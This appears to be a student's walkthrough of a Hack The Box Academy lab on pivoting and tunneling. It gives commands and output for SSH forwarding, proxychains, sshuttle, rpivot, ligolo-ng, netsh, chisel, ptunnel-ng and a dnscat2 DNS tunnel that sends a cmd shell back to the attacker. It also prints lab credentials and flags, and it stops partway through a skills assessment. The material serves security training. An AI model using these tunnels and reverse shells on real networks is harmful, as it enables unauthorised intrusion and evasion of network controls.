So this is pretty ease to do, all we need to do, is to ssh to the target with the above credentials and run ifconfig or ip a command to list all the network interfaces and simply count them
```c
ssh ubuntu@10.129.185.233
The authenticity of host '10.129.185.233 (10.129.185.233)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Enter password: HTB_@cademy_stdnt!

ubuntu@WEB01:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:ff:f0 brd ff:ff:ff:ff:ff:ff
    inet 10.129.185.233/16 brd 10.129.255.255 scope global dynamic ens192
       valid_lft 3010sec preferred_lft 3010sec
    inet6 dead:beef::250:56ff:fe94:fff0/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:fe94:fff0/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:94:5c:d2 brd ff:ff:ff:ff:ff:ff
    inet 172.16.5.129/23 brd 172.16.5.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe94:5cd2/64 scope link 
       valid_lft forever preferred_lft forever
```

2.  Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.

I have included the content of this module in this file as understanding the concepts and methods of pivoting and establishing tunneling are clearly written here, so you can scroll up and read it carefully. 

We need to use proxychains and nmap to scan for ports.
```c
proxychains nmap -v -Pn -sT 172.16.5.19
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Scanning 172.16.5.19 [1000 ports]
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:3306 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:139  ...  OK
Discovered open port 139/tcp on 172.16.5.19
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.19:1720 <--socket error or timeout!
.
SNIP
.
Nmap scan report for 172.16.5.19
Host is up (0.17s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
```

So as the task indicates to apply the concepts taught in THIS section, we need to use port 9050 to enable dynamic port forwarding with ssh as this port was used as example in the module. We see that 3389 RDP port is opened, so we can use rdp with proxychains, but first we need to set up SSH dynamic port forwarding on port 9050.
```c
ssh -D 9050 ubuntu@10.129.131.83
ubuntu@10.129.131.83's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
  System load:             0.0
  Usage of /:              30.4% of 13.72GB
  Memory usage:            31%
  Swap usage:              0%
  Processes:               179
  Users logged in:         0
  IPv4 address for ens192: 10.129.131.83
  IPv6 address for ens192: dead:beef::250:56ff:feb0:2d3c
  IPv4 address for ens224: 172.16.5.129
```
We used the above command to set up a dynamic SOCKS proxy, forwarding all traffic through port `9050` on your localhost. This ensures that traffic directed to `172.16.5.19` will pass through this SSH tunnel.


After that we can use proxychains with rdp and the credentials which are provided.
```c
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
Above command uses the `9050` port SOCKS proxy to reach the target network and authenticate with the provided credentials.

On the desktop you will find the flag.txt file.


### Remote/Reverse Port Forwarding with SSH

3. Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x) 

SSH to 10.129.131.83 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!" 

First we need to ssh to target
```c
ssh ubuntu@10.129.131.83  
ubuntu@10.129.131.83's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
  System load:             0.0
  Usage of /:              30.4% of 13.72GB
  Memory usage:            31%
  Swap usage:              0%
  Processes:               179
  Users logged in:         1
  IPv4 address for ens192: 10.129.131.83
  IPv6 address for ens192: dead:beef::250:56ff:feb0:2d3c
  IPv4 address for ens224: 172.16.5.129

```

And now the answer will be IP for ens224.

4.  What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x) 

The IP address `0.0.0.0` is commonly used to indicate that a service (like a handler) should **listen on all available IP addresses** assigned to a host.


### Meterpreter Tunneling & Port Forwarding

5. What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)

SSH to 10.129.131.83 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!"

First we ssh to target system
```c
ssh ubuntu@10.129.79.174

```

Then we can use the following ping-sweep command which will ping any device in the network range we specify. 
```c
ubuntu@WEB01:~$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.313 ms
64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.026 ms

```

So we see that there are 2 ip addresses that we have discovered using ping-sweep method

6. Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x) 

For that we can run the following command to view information about the session we recently established. Flag -r is to display routing table
```c
ubuntu@WEB01:~$ netstat -r
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
default         10.129.0.1      0.0.0.0         UG        0 0          0 ens192
10.129.0.0      0.0.0.0         255.255.0.0     U         0 0          0 ens192
172.16.4.0      0.0.0.0         255.255.254.0   U         0 0          0 ens224
```

### SSH for Windows: plink.exe

7. Attempt to use Plink from a Windows-based attack host. Set up a proxy connection and RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. When finished, submit "I tried Plink" as the answer.

As it is not mandatory exercise but to do that we need to install plink on our attack machine and them enter the following command
```c
plink -ssh -L 3389:172.16.5.19:3389 victor@10.129.79.174 -pw "pass@123"
```
- This command sets up an SSH tunnel through the host at `10.129.79.174`, forwarding your local port `3389` to the target machine `172.16.5.19:3389`.
- `-pw "pass@123"` authenticates with the password directly.

After that as the tunnel is up we can rdp to connect to 127.0.0.1
```c
xfreerdp /u:victor /p:pass@123 /v:127.0.0.1
```

### SSH Pivoting with Sshuttle

8. Try using sshuttle from Pwnbox to connect via RDP to the Windows target (172.16.5.19) with "victor:pass@123" on the internal network. Once completed type: "I tried sshuttle" as the answer.

First we need to install sshuttle
```c
sudo apt-get insatll sshuttle
```

Then we need to run the following command. We specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.19
```c
sudo sshuttle -r ubuntu@10.129.25.208 172.16.5.19 -v
[sudo] password for r3so1v3: 
Starting sshuttle proxy (version 1.1.2).
c : Starting firewall manager with command: ['/usr/bin/python3', '/usr/bin/sshuttle', '-v', '--method', 'auto', '--firewall']
fw: Starting firewall with Python version 3.12.6
fw: ready method name nat.
c : IPv6 enabled: Using default IPv6 listen address ::1
c : Method: nat
c : IPv4: on
c : IPv6: on
c : UDP : off (not available with nat method)
c : DNS : off (available)
c : User: off (available)
c : Subnets to forward through remote host (type, IP, cidr mask width, startPort, endPort):
c :   (<AddressFamily.AF_INET: 2>, '172.16.5.19', 32, 0, 0)
c : Subnets to exclude from forwarding:
c :   (<AddressFamily.AF_INET: 2>, '127.0.0.1', 32, 0, 0)
c :   (<AddressFamily.AF_INET6: 10>, '::1', 128, 0, 0)
c : TCP redirector listening on ('::1', 12300, 0, 0).
c : TCP redirector listening on ('127.0.0.1', 12300).
c : Starting client with Python version 3.12.6
c : Connecting to server...
The authenticity of host '10.129.25.208 (10.129.25.208)' can't be established.
ED25519 key fingerprint is SHA256:AtNYHXCA7dVpi58LB+uuPe9xvc2lJwA6y7q82kZoBNM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.25.208' (ED25519) to the list of known hosts.
ubuntu@10.129.25.208's password: 
 s: Running server on remote host with /usr/bin/python3 (version 3.8.10)
 s: latency control setting = True
 s: auto-nets:False
c : Connected to server.
fw: setting up.
fw: ip6tables -w -t nat -N sshuttle-12300
fw: ip6tables -w -t nat -F sshuttle-12300
fw: ip6tables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: ip6tables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN --dest ::1/128 -p tcp
fw: ip6tables -w -t nat -A sshuttle-12300 -j RETURN -m addrtype --dst-type LOCAL
fw: iptables -w -t nat -N sshuttle-12300
fw: iptables -w -t nat -F sshuttle-12300
fw: iptables -w -t nat -I OUTPUT 1 -j sshuttle-12300
fw: iptables -w -t nat -I PREROUTING 1 -j sshuttle-12300
fw: iptables -w -t nat -A sshuttle-12300 -j RETURN --dest 127.0.0.1/32 -p tcp
fw: iptables -w -t nat -A sshuttle-12300 -j REDIRECT --dest 172.16.5.19/32 -p tcp --to-ports 12300

```

After that we can rdp to the windows target
```c
xfreerdp /v:172.16.5.19 /u:victor                
[23:36:23:991] [3787:3788] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[23:36:23:991] [3787:3788] [WARN][com.freerdp.crypto] - CN = DC01.inlanefreight.local
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - The host key for 172.16.5.19:3389 has changed
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - @    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - Someone could be eavesdropping on you right now (man-in-the-middle attack)!
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - It is also possible that a host key has just been changed.
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - The fingerprint for the host key sent by the remote host is a8:b7:c1:90:bc:bf:49:1a:7d:0e:fe:9c:c4:d9:3c:65:dd:cb:0f:81:8c:33:b1:7f:3d:1e:dd:51:4c:33:2a:bc
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - Please contact your system administrator.
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - Add correct host key in /home/r3so1v3/.config/freerdp/known_hosts2 to get rid of this message.
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - Host key for 172.16.5.19 has changed and you have requested strict checking.
[23:36:23:995] [3787:3788] [ERROR][com.freerdp.crypto] - Host key verification failed.
!!!Certificate for 172.16.5.19:3389 (RDP-Server) has changed!!!

New Certificate details:
        Common Name: DC01.inlanefreight.local
        Subject:     CN = DC01.inlanefreight.local
        Issuer:      CN = DC01.inlanefreight.local
        Thumbprint:  a8:b7:c1:90:bc:bf:49:1a:7d:0e:fe:9c:c4:d9:3c:65:dd:cb:0f:81:8c:33:b1:7f:3d:1e:dd:51:4c:33:2a:bc

Old Certificate details:
        Subject:     CN = DC01.inlanefreight.local
        Issuer:      CN = DC01.inlanefreight.local
        Thumbprint:  91:9a:0e:a6:ce:de:1c:8c:0b:6b:fc:3f:2e:68:10:56:c0:79:f0:d2:e6:a6:7b:2b:31:49:a9:5a:c3:19:d7:a7

```


### Web Server Pivoting with Rpivot

9. From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer. 

So logically we need to run rpivot's server.py from Attack's host. Simply read the module 


10. From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer. 

And here we need to run client.py from Pivot host

11. Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.

SSH to with user "ubuntu" and password "HTB_@cademy_stdnt!"

First we need to transfer our rpivot directory to our target machine
```c
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

Then from out attack machine we need to run the following command from the directory where we installed rpivot. We can start our rpivot SOCKS proxy server to connect to our client on the compromised Ubuntu server using server.py.
```c
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Then we need to ssh to our target
```c
ssh ubuntu@10.129.24.94  
ubuntu@10.129.24.94's password: HTB_@cademy_stdnt!
```

After that on the target machine we run the following command
```c
python2.7 client.py --server-ip 10.10.16.69 --server-port 9999
Backconnecting to server 10.10.16.69 port 9999
```

Then we open another tab in our attack machine and use proxychains to open the webpage
```c
proxychains firefox http://172.16.5.135
```
---
This method did not worked for me, although I've done everything in the coherent order, as in the module. But now I am going to show you how to use `ligolo-ng` tool which is capable of doing pivoting, tunneling and port forwarding.

First we need to download ligolo-ng from github to our attack machine
```c
https://github.com/nicocha30/ligolo-ng.git
```

After that we need to install golang, as ligolo-ng is written on it
```c
sudo apt update
sudo apt install golang -y
```

Then we need to go to ligolo-ng directory and compile the binaries
```c
cd ligolo-ng 
make
```

Then we need to go to dist folder and see the following files
```c
ls 
ligolo-ng-agent-linux_amd64 
ligolo-ng-agent-windows_amd64.exe 
ligolo-ng-proxy-linux_amd64 
ligolo-ng-proxy-windows_amd64.exe
```

For better experience using ligolo-ng we can rename the next files
```c
mv ligolo-ng-agent-linux_amd64 agent
mv ligolo-ng-proxy-linux_amd64 relay
```

And then copy them to `/usr/local/bin` to be able to use ligolo-ng form any directory in our attack machine
```c
sudo cp agent /usr/local/bin/ 
sudo cp relay /usr/local/bin/
```

After that we can verify that everything is working properly
```c
relay -h
agent -h
```

So, as we successfully installed ligolo-ng and made it working, we can now begin to solve our task. 
As we did we rpivot, we need to transfer our ligolo-ng directory to our target, via scp
```c
scp -r ligolo-ng ubuntu@10.129.24.94:/home/ubuntu/    
```

Make sure you run the above command in the directory you downloaded your ligolo-ng, for .i.e 
```c
$ ls
DEBIAN  MullvadVPN-2024.4_amd64.deb  cacert.der  ligolo-ng  opt  rpivot  usr
```

Then as we hit enter and inserted password and transfer have completed to target host, we can run the following command from our attack machine
```c
relay -laddr 0.0.0.0:9050 -selfcert

WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
WARN[0000] TLS Certificate fingerprint for ligolo is: 7925AB57FB2E00B9DABDA69400481EFAA19F7E5D2C6A6DF2D5CB579F46C511C5 
INFO[0000] Listening on 0.0.0.0:9050                    
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/                                      
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /                             
        /____/                          /____/                                     
  Made in France ♥            by @Nicocha30!                        
  Version: dev                               
ligolo-ng »
```

- `-laddr 0.0.0.0:9050` specifies that it should listen on all network interfaces on port `9050`. We can check the port in /etc/proxychains4.conf file in the very end
where it should be displayed something like this
```c
socks4  127.0.0.1 9050
```
- `-selfcert` generates a self-signed certificate, which is generally sufficient for internal tunneling.

After running relay command, we need to make sure that our agent file is executable on the target.
```c
ubuntu@WEB01:~/ligolo-ng/dist$ chmod +x agent 
```

Then we run the following command from the target host which will connect to our relay on the attack machine
```c
ubuntu@WEB01:~/ligolo-ng/dist$ ./agent -connect 10.10.16.69:9050 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.16.69:9050"
```

As you see we have established connection, and we can confirm that by going to the tab on our attack machine, where we executed the relay command
```c                                                 
ligolo-ng » INFO[0007] Agent joined.                                 name=ubuntu@WEB01 remote="10.129.24.94:53506
```

After that we can use proxychains to open firefox windows and get flag. On the attack machine run the following command
```c
proxychains firefox-esr 172.16.5.135
```

We can figure out which port to use by running the following command from the target host
```c
ubuntu@WEB01:~/rpivot$ for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
64 bytes from 172.16.5.129: icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from 172.16.5.135: icmp_seq=1 ttl=64 time=0.718 ms
```

In our case ip was `172.16.5.135` 
When you run proxychains command above, firefox will open, and you will see a webpage and flag 

### Port Forwarding with Windows Netsh

12. Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive) 

RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!"

So first of all we need to rdp to our target host
```c
xfreerdp /v:10.129.42.198 /u:htb-student                      
[09:11:37:410] [2932:2933] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[09:11:37:411] [2932:2933] [WARN][com.freerdp.crypto] - CN = OFFICEMANAGER
Password: HTB_@cademy_stdnt!
```

Then we need to open 2 cmd sessions, both as administrator
In the fist one we need to enter the following command which forwards all data received on a specific port (say 8080) to a remote host on a remote port
```c
C:\Windows\system32>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19
```

Then on the second cmd session we run the following command which configures the portproxy on our Windows-based pivot host. Then we will try to connect to the 8080 port of this host from our attack host using xfreerdp. Once a request is sent from our attack host, the Windows host will route our traffic according to the proxy settings configured by netsh.exe.
```c
C:\Windows\system32>netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.19     3389
```

After running the above command we can now rdp to the target host with creds: `victor:pass@123`
```c
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
```

Then we go to `Approved Vendors` folder on the desktop and open file where we get our answer
```c
- In case of incident contact: 

Jim Flipflop
123-123-1234
CAT5 Security
```


### DNS Tunneling with Dnscat2

13. Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer. 

 RDP to with user "htb-student" and password "HTB_@cademy_stdnt!"

First we download and install dnscat on our attacking machine
```c
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Then we need to also download dnscat for powershell, so we can transfer it later to our target machine
```c
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Once downloaded we can use python server to transfer it. On the attacking machine run
```c
ip a | grep tun0
3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
    inet 10.10.16.69/23 scope global tun0
python3 -m http.server 8088                                                 
Serving HTTP on 0.0.0.0 port 8088 (http://0.0.0.0:8088/)
```

Then we need to rdp to the target
```c
rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' -N 10.129.38.89
```

After establishing connection we need to open powershell and chrome
In chrome we need to insert our IP and port to download dnscat for powershell. I have made zip archive of the entire folder of dnscat2-powershell to be able to download it in one click
```c
http://10.10.16.69:8088
```

Find the zip file and download it. 
Then we go to powershell and change our directory to where we downloaded dnscat
```c
PS C:\Users\htb-student> Import-Module .\dnscat2.ps1                                                                      
```

Later we run the following command. After running the server, it will provide us the secret key, which we will have to provide to our dnscat2 client on the Windows host so that it can authenticate and encrypt the data that is sent to our external dnscat2 server.
```c
sudo ruby dnscat2.rb --dns host=10.10.16.69,port=53,domain=inlanefreight.local --no-cache
[sudo] password for r3so1v3: 

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.16.69:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=847bbd84144140fcc91d2a0a4f29e59f inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=847bbd84144140fcc91d2a0a4f29e59f

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

```

After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server. Don't forget to specify the correct secret
```c
PS C:\Users\htb-student> Start-Dnscat2 -DNSserver 10.10.16.69 -Domain inlanefreight.local -PreSharedSecret 847bbd84144140fcc91d2a0a4f29e59f -Exec cmd  
```

Then we need to type the following
```c
dnscat2> window -i 1
?
Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
dnscat2> window -i 2
New window created: 2
history_size (session) => 1000
Session 2 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
exec (OFFICEMANAGER) 2> type C:\Users\htb-student\Documents\flag.txt
AC@tinth3Tunnel
```


### SOCKS5 Tunneling with Chisel

14. Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer. 

SSH to with user "ubuntu" and password "HTB_@cademy_stdnt!"

Chisel is a TCP/UDP-based tunneling tool written in Go that uses HTTP to transport data that is secured using SSH. Chisel can create a client-server tunnel connection in a firewall restricted environment

First we need to download it to our attack host
```c
git clone https://github.com/jpillora/chisel.git  
```

Then we need to build binaries
```c
go build 
```

Also we can download chisel from the following site `https://github.com/jpillora/chisel/releases`
and then run
```c
gunzip chisel_1.10.1_linux_amd64.gz                                     
┌──(r3so1v3㉿kali)-[~/Hacking/academy/pivoting-tunneling-portforwarding]
└─$ ls
chisel  chisel_1.10.1_linux_amd64  chisel_1.10.1_linux_amd64.deb  dnscat2  dnscat2-powershell  dnscat2-powershell.zip                                  
┌──(r3so1v3㉿kali)-[~/Hacking/academy/pivoting-tunneling-portforwarding]
└─$ chmod +x chisel_1.10.1_linux_amd64                                    
┌──(r3so1v3㉿kali)-[~/Hacking/academy/pivoting-tunneling-portforwarding]
└─$ ls
chisel  chisel_1.10.1_linux_amd64  chisel_1.10.1_linux_amd64.deb  dnscat2  dnscat2-powershell  dnscat2-powershell.zip                                
┌──(r3so1v3㉿kali)-[~/Hacking/academy/pivoting-tunneling-portforwarding]
└─$ mv chisel_1.10.1_linux_amd64 chisel-suka

```

I have been playing around with wrong versions that are not supported on the target and after running the command, have been getting errors. The Chisel listener will listen for incoming connections on port 1234 using SOCKS5 (--socks5) and forward it to all the networks that are accessible from the pivot host. In our case, the pivot host has an interface on the 172.16.5.0/23 network, which will allow us to reach hosts on that network.
```c
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5 
./chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./chisel)` ./chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./chisel)`
```
So sorry for my rage)

Then on the attack machine I run a client command on our attack host and connect to the Chisel server.
```c
./chisel-suka client -v 10.129.58.12:1234 socks

2024/11/06 11:45:33 client: Connecting to ws://10.129.58.12:1234
2024/11/06 11:45:33 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2024/11/06 11:45:33 client: tun: Bound proxies
2024/11/06 11:45:34 client: Handshaking...
2024/11/06 11:45:37 client: Sending config
2024/11/06 11:45:38 client: Connected (Latency 290.195515ms)
2024/11/06 11:45:38 client: tun: SSH connected
```

As you can see in the above output, the Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.

And on the target host we get our handshaking
```c
ubuntu@WEB01:~$ ./chisel-suka server -v -p 1234 --socks5
2024/11/06 06:52:46 server: Fingerprint UeT/SQ9Y8/WY0ejhCrGcHyxYbAMq1/TB3OIO7qXiYiQ=
2024/11/06 06:52:46 server: Listening on http://0.0.0.0:1234
2024/11/06 06:52:48 server: session#1: Handshaking with 10.10.16.69:51600...
2024/11/06 06:52:49 server: Failed to handshake (websocket: close 1006 (abnormal closure): unexpected EOF)
2024/11/06 06:52:48.477 GET / 200 1s (10.10.16.69)
```

After that we can rdp as victor and get flag
```c
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123   

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.5.19:3389  ...  OK
Th3$eTunne1$@rent8oring!
```


### ICMP Tunneling with SOCKS

15. Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer.

SSH to with user "ubuntu" and password "HTB_@cademy_stdnt!"

ICMP tunneling encapsulates traffic within ICMP packets containing echo requests and responses. ICMP tunneling would only work when ping responses are permitted within a firewalled network
First of all we need to install ptunnel.ng
```c
git clone https://github.com/utoni/ptunnel-ng.git
```

Then we need to transfer it to target host
```c
scp -r ptunnel-ng ubuntu@10.129.26.220:~/
```

Then we need to ssh to target and run tunnel server on the pivot (target) host
```c
ssh ubuntu@10.129.26.220
ubuntu@WEB01:~/ptunnel-ng$ cd src
ubuntu@WEB01:~/ptunnel-ng/src$ ./ptunnel-ng -p 5000
[err]: Failed to open pidfile: "/run/ptunnel.pid", Cause: Permission denied
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

After that we start server in the pivot machine 
```c
buntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r172.16.5.19 -R3389
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
[inf]: Incoming tunnel request from 10.10.16.69.
[inf]: Starting new session to 172.16.5.19:3389 with ID 52107
```

And then the client in attack machine
```c
sudo ./ptunnel-ng -p10.129.26.220 -l3388 -r172.16.5.19 -R3389
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

Finally we can rdp to our target 
```c
xfreerdp /v:127.0.0.1:3388 /u:victor /p:pass@123
```

And get the flag in the Downloads folder
```
N3Tw0rkTunnelV1sion!
```


### RDP and SOCKS Tunneling with SocksOverRDP

16. Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.

RDP to  with user "htb-student" and password "HTB_@cademy_stdnt!"

 [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) is an example of a tool that uses `Dynamic Virtual Channels` (`DVC`) from the Remote Desktop Service feature of Windows. DVC is responsible for tunneling packets over the RDP connection. Some examples of usage of this feature would be clipboard data transfer and audio sharing. However, this feature can also be used to tunnel arbitrary packets over the network. We can use `SocksOverRDP` to tunnel our custom packets and then proxy through it. We will use the tool [Proxifier](https://www.proxifier.com/) as our proxy server.

First we need to download SocksOverRDP and Proxifier to our attack machine
```c
```







```
H0pping@roundwithRDP!
```


## Skills Assessment

17. Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer. 

As we are provided with IP address, we need to open browser and paste the IP, as it is a webshell
![](https://i.imgur.com/XmdKecP.png)


18. Submit the credentials found in the user's home directory. (Format: user:password) 

Simply list all the files and open one file
![](https://i.imgur.com/SmZ4zwb.png)


19. Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.

